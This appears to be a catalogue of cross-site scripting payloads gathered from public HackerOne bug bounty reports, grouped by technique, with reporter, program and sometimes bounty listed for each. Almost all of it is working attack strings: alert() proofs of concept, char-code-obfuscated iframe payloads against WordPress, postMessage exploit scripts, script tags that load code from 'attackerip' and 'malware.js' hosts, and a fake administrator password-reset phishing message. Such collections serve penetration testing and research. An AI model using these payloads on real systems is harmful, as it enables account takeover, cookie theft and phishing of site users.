**Parameter:** `WhatSubmitted`
— [RXSS on █████████](https://hackerone.com/reports/1627616) · U.S. Dept Of Defense · [tmz900](https://hackerone.com/tmz900)


## HTML img tag onerror JavaScript injection (XSS)

### `10c185eb`

```
<img src=x onerror=alert(1)"
```

— [Stored Cross-Site Scripting in Map Share Page](https://hackerone.com/reports/65284) · Mapbox · [hussain_0x3c](https://hackerone.com/hussain_0x3c)

### `7a07b8f5`

```
["search","","target/search_md.html","","<p><img/src=\".\"/onerror=alert(\"search\")>\n"]
```

— [XSS in HTML generated by RDoc](https://hackerone.com/reports/1187156) · Ruby · [ooooooo_q](https://hackerone.com/ooooooo_q)

### `6b8ccc44`

```
<img src=x onerror="location='https://target.com/drive-by-download'">
```

— [Stored XSS in Rocket.Chat HTML File Export — Unauthenticated Entry via LiveChat](https://hackerone.com/reports/3779690) · Rocket.Chat · [olidayw](https://hackerone.com/olidayw)

### `07a7df4f`

```
<img onerror>
```

— [Stored XSS in Rocket.Chat HTML File Export — Unauthenticated Entry via LiveChat](https://hackerone.com/reports/3779690) · Rocket.Chat · [olidayw](https://hackerone.com/olidayw)


## HTML injection via img onerror in username path segment causing XSS

### `956ed8f7`

```
{
	"product": {
		"variants": [{
			"stripping": false,
			"title": "<option/><select/><img src=xx: onerror=alert('bored-engineer')>"
		}, {}],
		"options": [],
		"images": [{}],
		"image": {}
	}
}
```

— [XSS on "target.com" via "stripping" attribute and "shop" parameter](https://hackerone.com/reports/246794) · Shopify · [bored-engineer](https://hackerone.com/bored-engineer) · $1,000.0

### `c54c09eb`

```
http://target.com/user/phoenixrachel%22%3E%3Cimg%20src=x%20onerror=alert(1
```

**Parameter:** `user`
— [XSS in imgur mobile](https://hackerone.com/reports/106982) · Imgur · [charfee](https://hackerone.com/charfee)

### `1476eeab`

```
http://target.com/user/%22%3E%3Cimg%20src=x%20onerror=alert(1
```

**Parameter:** `user`
— [XSS in imgur mobile 3](https://hackerone.com/reports/107036) · Imgur · [charfee](https://hackerone.com/charfee)

### `ad0f1eee`

```
http://target.com/search/suggest/q/xss<img%20src=x%20onerror=alert()>1337
```

**Parameter:** `q`
— [XSS at http://target.com/search/suggest/q/{xss payload}](https://hackerone.com/reports/1244722) · MTN Group · [homosec](https://hackerone.com/homosec)


## HTTP response splitting (CRLF injection) to inject a <script>alert(document.domain)</script> payload

### `97d4ff73`

```
http://target.com/%3f%0d%0aLocation:%0d%0aContent-Type:text/html%0d%0aX-XSS-Protection%3a0%0d%0a%0d%0a%3Cscript%3Ealert%28document.domain%29%3C/script%3E
```

— [\[target.com\] CRLF Injection, XSS](https://hackerone.com/reports/192667) · Starbucks · [bobrov](https://hackerone.com/bobrov)

### `d86cdea0`

```
http://target.com/%3f%0D%0ALocation://x:1%0D%0AContent-Type:text/html%0D%0AX-XSS-Protection%3a0%0D%0A%0D%0A%3Cscript%3Ealert(document.domain)%3C/script%3E
```

— [\[target.com\] CRLF Injection, XSS](https://hackerone.com/reports/192667) · Starbucks · [bobrov](https://hackerone.com/bobrov)

### `7d3e1e63`

```
http://target.com/%0d%0aContent-Length:35%0d%0aX-XSS-Protection:0%0d%0a%0d%0a23%0d%0a<svg%20onload=alert(document.domain)>%0d%0a0%0d%0a/%2e%2e
```

— [\[target.com\] CRLF Injection, XSS](https://hackerone.com/reports/192749) · Starbucks · [bobrov](https://hackerone.com/bobrov)

### `8aa23bc4`

```
http://target.com/%0d%0aContent-Length:35%0d%0aX-XSS-Protection:0%0d%0a%0d%0a23%0d%0a<svg%20onload=alert(document.domain)>%0d%0a0%0d%0a/%2f%2e%2e
```

— [\[target.com\] CRLF Injection, XSS](https://hackerone.com/reports/192749) · Starbucks · [bobrov](https://hackerone.com/bobrov)


## JavaScript URI XSS via returnUrl parameter

### `a336d115`

```
javascripT:target.com
```

**Parameter:** `returnUrl`
— [XSS \[flow\] - on target.com/paypalme/my/landing (requires user interaction)](https://hackerone.com/reports/425200) · PayPal · [stefanovettorazzi](https://hackerone.com/stefanovettorazzi)

### `635ad534`

```
javascripT:*.target.com
```

**Parameter:** `returnUrl`
— [XSS \[flow\] - on target.com/paypalme/my/landing (requires user interaction)](https://hackerone.com/reports/425200) · PayPal · [stefanovettorazzi](https://hackerone.com/stefanovettorazzi)

### `5cafccc7`

```
javascripT://target.com
```

**Parameter:** `returnUrl`
— [XSS \[flow\] - on target.com/paypalme/my/landing (requires user interaction)](https://hackerone.com/reports/425200) · PayPal · [stefanovettorazzi](https://hackerone.com/stefanovettorazzi)

### `67dff0ee`

```
javascripT://*.target.com
```

**Parameter:** `returnUrl`
— [XSS \[flow\] - on target.com/paypalme/my/landing (requires user interaction)](https://hackerone.com/reports/425200) · PayPal · [stefanovettorazzi](https://hackerone.com/stefanovettorazzi)


## Reflected XSS via attribute injection (img onerror) in the "attributes" parameter

### `e75dabd9`

```
"><img src=x onerror=prompt('XSS');>
```

**Parameter:** `attributes`
— [Stored xss ](https://hackerone.com/reports/149154) · Algolia · [sysecure](https://hackerone.com/sysecure) · $100.0

### `c60df04e`

```
'"><img src=x onerror=
```

— [\[GitHub Extension\] Unsanitised HTML leading to XSS on target.com](https://hackerone.com/reports/220494) · Algolia · [ysx](https://hackerone.com/ysx)

### `2e5bd3b6`

```
"><script src=http://attackerip/blind.js/>
```

— [Stored XSS via Comment Form at ████████](https://hackerone.com/reports/915073) · U.S. Dept Of Defense · [z32](https://hackerone.com/z32)

### `09019d24`

```
http://target.com/admin/stats.php?statsBreakdown=day&listorder=key&orderdirection=up&day=&setPerPage=15%27%20onclick=alert(document.domain)%20accesskey=X%20&entity=global&breakdown=history&period_preset=last_month&period_start=01+December+2020&period_end=31+December+2020
```

**Parameter:** `setPerPage`
— [Reflected XSS on /admin/stats.php](https://hackerone.com/reports/1083376) · Revive Adserver · [solov9ev](https://hackerone.com/solov9ev)


## Reflected XSS by breaking out of a JavaScript string in the URL path (";alert(0)")

### `d8624a1b`

```
https://target.com/community/marketplace/%22;alert(0
```

— [XSS in Search Communities Function](https://hackerone.com/reports/47235) · Informatica · [ddworken](https://hackerone.com/ddworken)

### `47b7d9a3`

```
"}');alert(document.domain);console.log('
```

**Parameter:** `language_id`
— [XSS via modified Zomato widget (res_search_widget.php)](https://hackerone.com/reports/115402) · Eternal · [pr0tagon1st](https://hackerone.com/pr0tagon1st)

### `5725a0f9`

```
a'"><h1
```

— [\[GitHub Extension\] Unsanitised HTML leading to XSS on target.com](https://hackerone.com/reports/220494) · Algolia · [ysx](https://hackerone.com/ysx)

### `e55d49e6`

```
https://████████/portal/pls/portal/PORTAL.wwexp_render.show_tree?p_otype=SITEMAP&p_request=open&p_minusimage=&p_plusimage=&p_headerimage=%2Fimages%2Fbhfind2.gif&p_show_banner=NO&p_show_cancel=NO&p_open_item=1.FOLDER.FOLDERMAP.1_0&p_open_items=0.SITEMAP.FOLDERMAP.0_-1&p_domain=wwc&p_sub_domain=FOLDERMAP&p_title=Browse+Pages</title><script/src='https://target.com/hta3.js'></script>&p_datasource_data=document.SEARCH60_PAGESEARCH_362193163.ft&p_datasource_data=document.SEARCH60_PAGESEARCH_36219
```

**Parameter:** `p_title`
— [\[hta3\] Chain of ESI Injection & Reflected XSS leading to Account Takeover on \[███\]](https://hackerone.com/reports/1073780) · U.S. Dept Of Defense · [jr0ch17](https://hackerone.com/jr0ch17)


## Reflected XSS via unsanitized query parameter

### `3235fd1a`

```
https://target.com/php/liveSuggest.php?type=keyword&search_bar=1&q=ad&online_ordering=&search_city_id=5&entity_id=confirm(1
```

**Parameter:** `entity_id`
— [target.com Reflected Cross Site Scripting](https://hackerone.com/reports/303522) · Eternal · [akamble937](https://hackerone.com/akamble937) · $100.0

### `a24d4615`

```
3. Add the payload ?trg="><script>alert(1)</script>
```

**Parameter:** `trg`
— [Reflected XSS in https://target.com](https://hackerone.com/reports/824433) · Myndr · [thilakesh](https://hackerone.com/thilakesh)

### `6e3b52c3`

```
https://www.███.mil/?code=%27;prompt(%27XSS%27
```

**Parameter:** `code`
— [XSS found in https://www.████████.mil](https://hackerone.com/reports/2853410) · U.S. Dept Of Defense · [thpless](https://hackerone.com/thpless)

### `b07c5c35`

```
https://www.████████.mil/?code=%27;prompt(%27XSS%27
```

**Parameter:** `code`
— [XSS found in https://www.████████.mil](https://hackerone.com/reports/2853410) · U.S. Dept Of Defense · [thpless](https://hackerone.com/thpless)


## Stored XSS via HTML attribute injection using an <img> onerror handler

### `dba4c847`

```
€{{amount}} "><img src=x onerror=prompt(document.domain)>
```

— [Stored XSS on buy button](https://hackerone.com/reports/397088) · Shopify · [tony_tsep](https://hackerone.com/tony_tsep) · $500.0

### `f217901c`

```
6. Change the Style Name with <noscript><p title= "</noscript><img src=x onerror=alert(document.cookie)>">, check the checkbox next to Save Style, click Save Style.
```

— [Stored XSS in target.com](https://hackerone.com/reports/1054526) · Automattic · [ucuping](https://hackerone.com/ucuping)

### `1ef190fb`

```
luc1d"><img/src="x"onerror=alert(document.domain)>@wearehackerone.com
```

**Parameter:** `email`
— [Stored XSS on target.com](https://hackerone.com/reports/1107726) · Shopify · [luc1d](https://hackerone.com/luc1d)

### `757b5b7b`

```
Payload 1:
----------
<h1 onmouseover=alert(document.domain)>XSS</h1>

Payload 2:
----------
<img src=x onerror=alert(1)>
```

**Parameter:** `promo_code`
— [Stored Cross Site Scripting at http://target.com/ADMIN/store/index.cfm?fa=disprocode](https://hackerone.com/reports/1164853) · Acronis · [ub3rsick](https://hackerone.com/ub3rsick)


## XSS using javascript: URI in iframe src with char‑code eval payload

### `bb6fee8f`

```
<iframe src=javascript:eval(String.fromCharCode.apply(null,[108,101,116,32,116,101,115,116,32,61,32,49,50,51,59,10,97,108,101,114,116,40,116,101,115,116,41,59])) width=0 height=0 style=display:none;></iframe>
```

— [Stored XSS in Private Message component (BuddyPress)](https://hackerone.com/reports/487081) · WordPress · [klmunday](https://hackerone.com/klmunday)

### `d9abaf65`

```
This is a malicious message.                    <iframe src=javascript:eval(String.fromCharCode.apply(null,[108,101,116,32,110,97,109,101,32,61,32,112,97,114,101,110,116,46,66,80,95,78,111,117,118,101,97,117,46,109,101,115,115,97,103,101,115,46,114,111,111,116,85,114,108,46,115,112,108,105,116,40,39,47,39,41,91,50,93,59,10,108,101,116,32,117,114,108,32,61,32,112,97,114,101,110,116,46,108,111,99,97,116,105,111,110,46,111,114,105,103,105,110,32,43,32,39,47,109,101,109,98,101,114,115,47,39,32,43,32
```

— [Stored XSS in Private Message component (BuddyPress)](https://hackerone.com/reports/487081) · WordPress · [klmunday](https://hackerone.com/klmunday)

### `cc472c51`

```
This is a malicious message.                    <iframe src=javascript:eval(String.fromCharCode.apply(null,[108,101,116,32,110,101,119,95,115,105,116,101,95,116,105,116,108,101,32,61,32,39,72,65,67,75,69,68,39,59,10,108,101,116,32,110,101,119,95,115,105,116,101,95,100,101,115,99,114,105,112,116,105,111,110,32,61,32,39,118,105,97,32,88,83,83,39,59,10,108,101,116,32,117,114,108,32,61,32,112,97,114,101,110,116,46,108,111,99,97,116,105,111,110,46,111,114,105,103,105,110,32,43,32,39,47,119,112,45,97,
```

— [Stored XSS in Private Message component (BuddyPress)](https://hackerone.com/reports/487081) · WordPress · [klmunday](https://hackerone.com/klmunday)

### `4f6666c8`

```
This is a malicious message.                    <iframe src=javascript:eval(String.fromCharCode.apply(null,[108,101,116,32,117,114,108,32,61,32,112,97,114,101,110,116,46,108,111,99,97,116,105,111,110,46,111,114,105,103,105,110,32,43,32,39,47,119,112,45,97,100,109,105,110,47,117,115,101,114,45,101,100,105,116,46,112,104,112,63,117,115,101,114,95,105,100,61,50,38,119,112,95,104,116,116,112,95,114,101,102,101,114,101,114,61,47,119,112,45,97,100,109,105,110,47,117,115,101,114,115,46,112,104,112,39,5
```

— [Stored XSS in Private Message component (BuddyPress)](https://hackerone.com/reports/487081) · WordPress · [klmunday](https://hackerone.com/klmunday)


## AngularJS expression injection using constructor.constructor to execute JavaScript

### `a626d4bb`

```
[[constructor.constructor('alert(document.cookie)')()]]
```

— [Stored XSS via AngularJS Injection](https://hackerone.com/reports/141463) · drchrono · [yaworsk](https://hackerone.com/yaworsk)

### `f2fef0fd`

```
&#123;&#123;constructor.constructor('alert(document.domain)')()}}
```

— [\[target.com\] Reflected XSS](https://hackerone.com/reports/240256) · WordPress · [zeeshank](https://hackerone.com/zeeshank)

### `51d03b25`

```
{{constructor.constructor(&#39;alert(document.domain)&#39;)()}}
```

— [\[target.com\] Reflected XSS](https://hackerone.com/reports/240256) · WordPress · [zeeshank](https://hackerone.com/zeeshank)


## DOM‑based XSS via fragment identifier containing an image tag

### `942d02de`

```
https://target.com/#<img/src=
```

— [DOM-based XSS in target.com on IE 11](https://hackerone.com/reports/241619) · Starbucks · [albinowax](https://hackerone.com/albinowax)

### `c4e1ea4c`

```
https://target.com/#<img src=x onerror=alert('XSS')>
```

**Parameter:** `fragment`
— [DOM XSS at target.com in Microsoft Edge and IE Browser](https://hackerone.com/reports/704266) · ForeScout Technologies · [enesdexh1](https://hackerone.com/enesdexh1)

### `b7acaa44`

```
https://www.████frame.html#javascript:alert(document.domain
```

— [DOM XSS on https://www.███████](https://hackerone.com/reports/922496) · U.S. Dept Of Defense · [gamer7112](https://hackerone.com/gamer7112)


## DOM‑based XSS via injected <button> with autofocus and onfocus attribute executing Function

### `a53ebda6`

```
--><button/autofocus/onfocus=Function("confirm`1`")();//name="XSS
```

**Parameter:** `username`
— [█████ - DOM-based XSS](https://hackerone.com/reports/377264) · U.S. Dept Of Defense · [yumi](https://hackerone.com/yumi)

### `4c010e92`

```
<script>
  function attack(){
  	var ctx=window.open('https://target.com/admin/themes');
    var interval;
    interval=setInterval(function(){
      if(window.attackSuccess){
        clearInterval(interval);
      }else{
        ctx.postMessage(`{"message":"Shopify.API.remoteRedirect","data":{"location":"javascript:alert(document.domain)"}}`);
      }
    },500);;
  }
</script>
<a href="javascript:attack()" style="display:block;text-align:center;width:100%;height:300px;line-height:300
```

— [DOM XSS via Shopify.API.remoteRedirect](https://hackerone.com/reports/576532) · Shopify · [yxw21](https://hackerone.com/yxw21)

### `983522fa`

```
<iframe id=ifr></iframe>
<script>
ifr.onload=function(){
    console.log(ifr.contentWindow.frames.length);
}
</script>
```

— [self-xss with ClickJacking can leads to account takeover in Firefox](https://hackerone.com/reports/892289) · Imgur · [keer0k](https://hackerone.com/keer0k)


## HTML attribute injection using <img src=x onerror=...> to execute JavaScript

### `7b11fd84`

```
">&#60;img src=x onerror=prompt(&#100;&#111;&#99;&#117;&#109;&#101;&#110;&#116;&#46;&#100;&#111;&#109;&#97;&#105;&#110;)>
```

**Parameter:** `name`
— [Stored XSS in Question edit from product name](https://hackerone.com/reports/1416672) · Judge.me  · [chupa__chups](https://hackerone.com/chupa__chups)

### `2b7710c7`

```
">&#60;"><img src=x onerror=prompt(document.domain)> img src=x onerror=prompt(&#100;&#111;&#99;&#117;&#109;&#101;&#110;&#116;&#46;&#100;&#111;&#109;&#97;&#105;&#110;)>
```

**Parameter:** `name`
— [stored XSS on AliExpress Review Importer/Products when delete product](https://hackerone.com/reports/1425882) · Judge.me  · [chupa__chups](https://hackerone.com/chupa__chups)

### `a6decf58`

```
"><"><img src=x onerror=prompt(document.domain)> img src=x onerror=prompt(document.domain)>
```

**Parameter:** `name`
— [stored XSS on AliExpress Review Importer/Products when delete product](https://hackerone.com/reports/1425882) · Judge.me  · [chupa__chups](https://hackerone.com/chupa__chups)


## JavaScript injection by breaking out of a quoted string and executing alert() (XSS)

### `5e58b1ac`

```
');alert(document.location);//
```

**Parameter:** `tagId`
— [Universal XSS with Playlist feature](https://hackerone.com/reports/1436558) · Brave Software · [nishimunea](https://hackerone.com/nishimunea) · $750.0

### `60ff9897`

```
";alert("XSS in "+document.domain);//
```

**Parameter:** `title`
— [\[target.com\] Persistent XSS through document title](https://hackerone.com/reports/181816) · Informatica · [kasperkarlsson](https://hackerone.com/kasperkarlsson)

### `3a4cda89`

```
',row:1}));alert("xss in path");debugger;(({y:'1
```

**Parameter:** `location`
— [Stored XSS vulnerability in additional URLs in 'Location' dialog \[Sitemap\]](https://hackerone.com/reports/251358) · Concrete CMS · [bl4de](https://hackerone.com/bl4de)


## JavaScript URI injection via the redirect query parameter (open‑redirect XSS)

### `c5dd0fa2`

```
https://target.com/?redirect=javascript:prompt(document.domain
```

**Parameter:** `redirect`
— [DOMXSS in redirect param](https://hackerone.com/reports/361287) · Semmle · [flamezzz](https://hackerone.com/flamezzz)

### `00f1271b`

```
?redirect_to=javascript:alert("XSS")
```

**Parameter:** `redirect_to`
— [XSS in new.loading.page.html](https://hackerone.com/reports/2419227) · GoCD · [aviv_keller](https://hackerone.com/aviv_keller)

### `29a9a6af`

```
https://target.com/portal/licensing-check?redirect_url=javascript:alert(document.domain
```

**Parameter:** `redirect_url`
— [Potential XSS in redirect_url Parameter](https://hackerone.com/reports/2653342) · Acronis · [kindone](https://hackerone.com/kindone)


## Reflected XSS via the "error" query parameter with an <img onerror> payload

### `c4367597`

```
https://target.com/admin/su/?Error=%3cscript%3ealert(document.domain
```

**Parameter:** `Error`
— [Reflected XSS via "Error" parameter on https://target.com/admin/su/](https://hackerone.com/reports/970878) · Acronis · [samincube](https://hackerone.com/samincube) · $50.0

### `b21fb017`

```
https://███████/users/user?error=<img src='x' onerror="alert(document.domain)">
```

**Parameter:** `error`
— [Reflected XSS on error message on Login Page](https://hackerone.com/reports/2417864) · U.S. Dept Of Defense · [kurogai](https://hackerone.com/kurogai)

### `332a8b91`

```
https://██████/users/user?error=<img src='x' onerror="alert(document.domain)">
```

**Parameter:** `error`
— [Reflected XSS on error message on Login Page](https://hackerone.com/reports/2417864) · U.S. Dept Of Defense · [kurogai](https://hackerone.com/kurogai)


## Reflected XSS using injected </script> and an img onerror payload in a query parameter

### `189c7eb0`

```
https://█████████/█████████CE399%22%3E%3C/script%3E%3Cimg%20src=x%20onerror=alert(document.domain
```

— [Reflected XSS in https://██████████ via "████████" parameter](https://hackerone.com/reports/1095765) · U.S. Dept Of Defense · [nirajgautamit](https://hackerone.com/nirajgautamit)

### `4c4dbc91`

````
2 - type the payload in the "First Name" input ```test";</script><script>alert(document.cookie)</script>
````

**Parameter:** `first_name`
— [Self XSS + CSRF Leads to Reflected XSS in https://████/ ](https://hackerone.com/reports/1109544) · U.S. Dept Of Defense · [sleepnotf0und](https://hackerone.com/sleepnotf0und)

### `f4e7df49`

```
<script>alert('Javascript is executed.')</script>
```

— [MetaMask Browser (on Android) does not enforce Content-Security-Policy header](https://hackerone.com/reports/1941767) · MetaMask · [renniepak](https://hackerone.com/renniepak)


## Reflected XSS via unsanitized GET parameter 'location'

### `881171e6`

```
https://target.com/signup/global/?place_id=ChIJPaCKh-tmA4wR7JEkNDrNDSU&location=Carolina<script
```

**Parameter:** `location`
— [XSS on target.com](https://hackerone.com/reports/42393) · Uber · [kirtixs](https://hackerone.com/kirtixs) · $500.0

### `0175fa7f`

```
https://target.com/roles/?%22%3E%3Cscript//src=data&colon;,alert(location)//
```

— [\[target.com\] Reflected XSS Query-String](https://hackerone.com/reports/389592) · Upserve  · [bobrov](https://hackerone.com/bobrov) · $250.0

### `9f3af3ca`

```
GET /roles/?%22%3E%3Cscript//src=data&colon;,alert(location)// HTTP/1.1
Host: target.com
```

— [\[target.com\] Reflected XSS Query-String](https://hackerone.com/reports/389592) · Upserve  · [bobrov](https://hackerone.com/bobrov) · $250.0


## Reflected XSS via a URL‑encoded <marquee> payload in the error_hint parameter

### `f82992b9`

```
https://target.com/oauth2/fallbacks/error?error=xss&error_description=xsssy&error_hint=%3Cmarquee%20loop%3d1%20width%3d0%20onfinish%3dco\u006efirm(document.cookie)%3EXSS%3C%2fmarquee%3E
```

**Parameter:** `error_hint`
— [\[target.com\] Reflected XSS at `oauth2/fallbacks/error` | ORY Hydra an OAuth 2.0 and OpenID Connect Provider](https://hackerone.com/reports/456333) · Eternal · [sudi](https://hackerone.com/sudi)

### `fba77dee`

```
https://██████████/██████=%3C/script%3E%3Cscript%3Ealert(document.domain
```

— [Reflected XSS on \[█████████\]](https://hackerone.com/reports/1267380) · U.S. Dept Of Defense · [saajanbhujel](https://hackerone.com/saajanbhujel)

### `a220c92d`

```
0xd3adc0de%26lt;ScRiPt%26gt;alert(%27XSS%20Success!%27)%26lt;/sCripT%26gt;
```

**Parameter:** `emailbody`
— [Reflected XSS in ██████](https://hackerone.com/reports/1873655) · U.S. Dept Of Defense · [0xd3adc0de](https://hackerone.com/0xd3adc0de)


## Stored XSS via attribute injection in the SEO Name field (onmouseover event)

### `d18883ea`

```
<a><pre lang='f/" onerror=alert(1) onload=alert(1) '><code lang="wavedrom">xss</code></pre></a>
```

— [Stored XSS via Kroki diagram](https://hackerone.com/reports/1731349) · GitLab · [vakzz](https://hackerone.com/vakzz) · $13,950.0

### `5ef1a686`

```
" onmouseover="alert('Stored XSS in SEO Name field')"
```

**Parameter:** `Name`
— [Stored XSS in Pages SEO dialog Name field (concrete5 8.1.0)](https://hackerone.com/reports/230029) · Concrete CMS · [bl4de](https://hackerone.com/bl4de)

### `99f73bc5`

```
5. You can place an XSS stored payload on the users profile in the first name field using ant" autofocus onfocus=prompt(1) x="
```

— [Account takeover leading to PII chained with stored XSS](https://hackerone.com/reports/1483201) · U.S. General Services Administration · [imthatt](https://hackerone.com/imthatt)


## Stored XSS via directory name injection

### `d9b3aed4`

```
"><iframe src="malware_frame.html">/                                           malware_frame.html
```

— [\[sexstatic\] HTML injection in directory name(s) leads to Stored XSS when malicious file is embed with <iframe> element used in directory name](https://hackerone.com/reports/328210) · Node.js third-party modules · [bl4de](https://hackerone.com/bl4de)

### `8a701c81`

```
"><iframe src="malware_frame.html">/
```

— [\[sexstatic\] HTML injection in directory name(s) leads to Stored XSS when malicious file is embed with <iframe> element used in directory name](https://hackerone.com/reports/328210) · Node.js third-party modules · [bl4de](https://hackerone.com/bl4de)

### `a2c5dae9`

```
"><svg onload=alert(5);>
```

— [\[html-pages\] Stored XSS in the filename when directories listing](https://hackerone.com/reports/330356) · Node.js third-party modules · [tungpun](https://hackerone.com/tungpun)


## Stored XSS via an <img> tag with an onload attribute in a chat message attachment

### `32716436`

```
payload i use = "><img src=x onerror=prompt(123)>
```

— [Stored XSS in "Create Groups"](https://hackerone.com/reports/647130) · GitLab · [rioncool22](https://hackerone.com/rioncool22) · $2,500.0

### `4626c5f6`

```
# Login to get Auth Token and User Id
curl http://127.0.0.1:3000/api/v1/login -d "username=<USER_NAME>&password=<PASSWORD>"

# Send crafted message
curl -H "X-Auth-Token: <USER_TOKEN>" -H "X-User-Id: <USER_ID>" http://127.0.0.1:3000/api/v1/chat.postMessage -d "channel=<CHANNEL_NAME>&attachments[0][image_url]=/assets/logo&attachments[0][fields][0][title]=&attachments[0][fields][0][value]=<img src=/assets/logo width=1 height=1 onload=alert('XSS4') />You're Pwned!"
```

**Parameter:** `attachments[0][fields][0][value]`
— [XSS via /api/v1/chat.postMessage ](https://hackerone.com/reports/219957) · Rocket.Chat · [gronke](https://hackerone.com/gronke)

### `5b1479eb`

```
<img src=x onerror=alert(/Stored_XSS/)>
```

— [Stored XSS in plan name field (Acronis Cyber Protect)](https://hackerone.com/reports/1940788) · Acronis · [und3sc0n0c1d0](https://hackerone.com/und3sc0n0c1d0)


## Stored XSS via injected <script> that calls history.pushState

### `460f71bd`

```
<script>history.pushState('', '', '/')</script>
```

— [\[Zomato's Blog\] POST based XSS on https://target.com/blog/wp-admin/admin-ajax.php?td_theme_name=Newspaper&v=8.2](https://hackerone.com/reports/335481) · Eternal · [inferno-](https://hackerone.com/inferno-) · $100.0

### `79f7e897`

```
<script>
	  function attack(){
	    let ctx=window.open('https://target.com'),interval;
	    let payload=btoa(`window.opener.postMessage('success',location.origin);alert(document.domain)`);
	    interval=setInterval(()=>{
	        ctx && ctx.postMessage({
        		"message":"Shopify.API.remoteRedirect",
        		"data":{
        			"location":`javascript:eval(atob('${payload}'))`
        		}
	        },location.origin);
	    },500);
	    window.onmessage=(e)=
```

— [██████ DOM XSS via Shopify.API.remoteRedirect](https://hackerone.com/reports/646505) · Shopify · [yxw21](https://hackerone.com/yxw21)

### `ebba0511`

```
<script>
if(document.location.hash.indexOf("secret") != -1) {
  secret = document.location.hash.split("=")[1];
  window.top.postMessage({"secret":secret,"message":"link","value":"javascript://"+document.location.host+"/%0aalert(document.domain);//"},"*");
}
</script>
```

— [wp-embed XSS on Safari](https://hackerone.com/reports/1238528) · WordPress · [zoczus](https://hackerone.com/zoczus)


## Stored XSS via injection of <script> tag in og:site_name meta property

### `1963b9bf`

```
requires_python='"><script>alert(1)</script>'
```

**Parameter:** `requires_python`
— [Stored XSS on PyPi simple API endpoint](https://hackerone.com/reports/856836) · GitLab · [vakzz](https://hackerone.com/vakzz) · $3,000.0

### `7855d170`

```
<!doctype html>
<html xmlns:og="http://target.com/ns#" lang="en">

<head>
    <meta charset="utf8">
    <title>metascraper</title>

    <meta property="og:description" content="The HR startups go to war.">
    <meta property="og:image" content="image">
    <meta property="og:site_name" content='<script src="http://127.0.0.1:8080/malware.js"></script>'>
    <meta property="og:title" content="test article">
    <meta property="og:type" content="article">
    <meta property="og:url" content="http://127
```

— [\[metascraper\] Stored XSS in Open Graph meta properties read by metascrapper](https://hackerone.com/reports/309367) · Node.js third-party modules · [bl4de](https://hackerone.com/bl4de)

### `fe5c3fbc`

```
">yvvdwf-label<form class='hidden gl-show-field-errors'><input title='<script>alert(document.domain)</script>'>
```

— [Bypass: Stored-XSS with CSP-bypass via scoped labels' color](https://hackerone.com/reports/1693150) · GitLab · [yvvdwf](https://hackerone.com/yvvdwf)


## Stored XSS via malicious filename containing an img onerror payload

### `6a6863e0`

```
test'"><img src=x onerror=alert(document.location)>.txt
```

— [Persistent XSS via filename in projects](https://hackerone.com/reports/662204) · Nextcloud · [foobar7](https://hackerone.com/foobar7) · $150.0

### `b3d0be56`

```
touch '"><img src=x onerror=alert("xss")>.jpg'
```

**Parameter:** `filename`
— [\[file-browser\] Inadequate Output Encoding and Escaping ](https://hackerone.com/reports/507303) · Node.js third-party modules · [johnssimon007](https://hackerone.com/johnssimon007)

### `9b3aa542`

```
~ $ touch \"\>\<object\ src\=1\ onerror\=\"javascript\:alert\(1\)\;\"\>Controlling\ what\ is\ documented\ here
~ $ ls
"><object src=1 onerror="javascript:alert(1);">Controlling what is documented here
~ $ rdoc --all
```

— [XSS exploit of RDoc documentation generated by rdoc](https://hackerone.com/reports/1321358) · Ruby · [sighook](https://hackerone.com/sighook)


## Stored XSS via malicious HTML file embedded in a tar.gz archive

### `a1a46a3b`

```
<html><script>alert(0)</script></html>
```

— [XSS In target.com Due to Mime Sniffing in IE](https://hackerone.com/reports/126197) · Uber · [ddworken](https://hackerone.com/ddworken) · $750.0

### `e70b817d`

```
<!-- malicious.html -->
<script>alert(document.domain)</script>
```

— [\[snekserve\] Stored XSS via filenames HTML formatted](https://hackerone.com/reports/694930) · Node.js third-party modules · [mik317](https://hackerone.com/mik317)

### `238e60bd`

```
<br/> <br/><br/><br/><br/><br/><marquee><p style="color:red;"><b>!!!!! IMPORTANT message from Nextcloud administrator !!!!!!</b></p></marquee><br/><br/> A security issue was found last night.<br/> <p style="color:green;">Please go to manually on <a><b>target.com</a></b> to reset your password.</p> <b><p style="color:red;">Thank you in advance for doing so as soon as possible. </p></b><br/><br/><i>The IT team.</i></b><br/><br/> <br/><br/><br/> <b><marquee><p style="color:red
```

— [HTML Injection on "polls" app - comments section (possibly XSS)](https://hackerone.com/reports/1108420) · Nextcloud · [supr4s](https://hackerone.com/supr4s)


## SVG onload XSS injection (DOM‑based)

### `76d59813`

```
3-Put your street address xss payload (xss"><!--><svg/onload=alert(document.domain)>)
```

— [Stored xss](https://hackerone.com/reports/415484) · Shopify · [dr_dragon](https://hackerone.com/dr_dragon) · $1,000.0

### `a31e132f`

```
https://target.com/<svg/onload=alert(document.domain
```

— [Stored XSS in Application menu via Home Page Url](https://hackerone.com/reports/797754) · Ping Identity · [renniepak](https://hackerone.com/renniepak)

### `cd85285b`

```
████████"document.cookie")>
```

— [Reflected Cross-Site Scripting (XSS)](https://hackerone.com/reports/3284534) · U.S. Dept Of Defense · [maskedpersian](https://hackerone.com/maskedpersian)


## SVG onload XSS payload

### `1e61fe60`

```
<svg width="100%" height="100%" viewBox="0 0 100 100" xmlns="http://target.com/2000/svg" onload="alert('script')">
  <script type="text/javascript"><![CDATA[
  // some exploit code here
  ]]></script>

  <circle cx="50" cy="50" r="50" fill="green" />
</svg>
```

— [Executing scripts on target.com using SVG](https://hackerone.com/reports/100565) · Slack · [kamil_hism](https://hackerone.com/kamil_hism)

### `ac51b4b1`

```
`<?xml version="1.0" standalone="no"?><!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "                                                "><svg onload="alert(1)" xmlns="                          ">
```

— [Unrestricted file upload leads to Stored XSS](https://hackerone.com/reports/880099) · GitLab · [semsem123](https://hackerone.com/semsem123)

### `52d966a2`

```
<input type="hidden" name="SAMLResponse" value="&quot;&gt;&lt;svg&#47;onload&#61;alert&#40;&apos;XSS&apos;&#41;&gt;" />
```

**Parameter:** `SAMLResponse`
— [XSS DUE TO CVE-2020-3580](https://hackerone.com/reports/1606068) · U.S. Dept Of Defense · [cruxn3t](https://hackerone.com/cruxn3t)


## URL‑encoded script tag injection via search parameter

### `b97cb359`

```
https://target.com/search?search=%3Cscript%3Ealert(document.domain
```

**Parameter:** `search`
— [Reflected XSS on a Atavist theme](https://hackerone.com/reports/947790) · Automattic · [bugra](https://hackerone.com/bugra)

### `ffb879bf`

```
https://target.com/search?search=%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E
```

**Parameter:** `search`
